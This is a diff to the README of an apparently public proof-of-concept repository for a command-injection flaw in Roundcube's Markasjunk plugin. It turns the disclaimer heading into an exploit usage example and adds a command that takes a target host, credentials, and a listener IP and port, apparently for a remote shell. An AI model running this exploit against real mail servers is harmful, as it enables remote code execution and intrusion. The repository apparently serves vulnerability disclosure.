@@ -20,10 +20,14 @@ This repository contains a Proof of Concept (PoC) for the `Markasjunk` plugin vu
 5. Verify that the command has been executed by checking for the presence of `test.txt` in the server's file system.
    [Reference](https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/)
 
-## Disclaimer
+## Exploit use example
 
 This PoC is for educational purposes only. Use it at your own risk. The author is not responsible for any damage caused by the misuse of this information.
+```
+./exploit vulnerablehost.com pwned@user.pwn PwnPassword! 127.0.0.1 1337
+```
 
+![PoC](https://github.com/s4orii/PoC-RoundCube-1.6.1-Plugin-RCE/blob/cb7bd7982d7e0a30b5cabee016c3aa05c378ea3f/PoC.gif)
 
 
 ## PoC Evidence
